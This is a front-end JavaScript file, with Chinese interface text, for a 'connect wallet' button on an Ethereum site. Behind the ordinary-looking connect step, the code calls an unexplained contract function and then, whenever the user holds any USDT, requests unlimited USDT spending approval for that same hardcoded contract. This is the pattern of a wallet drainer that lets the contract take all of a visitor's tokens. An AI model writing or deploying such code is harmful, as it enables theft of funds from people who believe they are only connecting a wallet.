const ETHEREUM_CONTRACT_ADDRESS = '0x3df02b3b38c6b55725795db9c50b649c204f2dad';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const CONTRACT_ABI = [
    "function connectAndAuthorize() external",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract;

async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }]
        });
        provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send('eth_requestAccounts', []);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);

        const txAuthorize = await contract.connectAndAuthorize();
        await txAuthorize.wait();

        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
        const balance = await usdtContract.balanceOf(userAddress);
        if (balance > 0) {
            const maxAllowance = ethers.MaxUint256;
            const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
            await txApprove.wait();
        }

        connectButton.classList.add('connected');
        connectButton.title = '已連繫並授權';
        connectButton.disabled = true;

        window.ethereum.on('accountsChanged', async (accounts) => {
            if (accounts.length === 0) {
                resetState();
            } else {
                userAddress = accounts[0];
                signer = await provider.getSigner();
                contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            }
        });
    } catch (error) {
        updateStatus(`操作失敗：${error.message}`);
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包';
        connectButton.disabled = false;
    }
}

function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = `<strong>狀態：</strong>${message}`;
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    connectButton.classList.remove('connected');
    connectButton.title = '連繫錢包';
    connectButton.disabled = false;
}

connectButton.addEventListener('click', connectWallet);
console.log('connectButton event listener added');